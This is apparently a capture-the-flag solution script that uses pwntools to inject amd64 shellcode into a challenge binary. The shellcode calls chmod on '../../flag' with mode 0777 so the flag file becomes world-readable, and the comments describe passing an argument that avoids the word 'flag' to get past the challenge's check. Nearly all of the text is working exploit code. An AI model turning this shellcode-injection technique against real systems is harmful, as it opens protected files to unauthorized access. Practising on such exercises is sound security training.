from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

assembly = f"""
    mov eax, 90
    lea rdi, [rip+flag]
    mov esi, 0x1ff
    syscall

flag:
    .string "../../flag"
"""

# the hostname will always be the same as challenge binary

# argv[1] can be anything that doesn't contain 'flag'
# here, I am just supplying the hostname, then the
# challenge will start reading shellcode from stdin

challenge_binary = os.getenv('HOSTNAME')
with process([f"/challenge/{challenge_binary}", challenge_binary]) as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
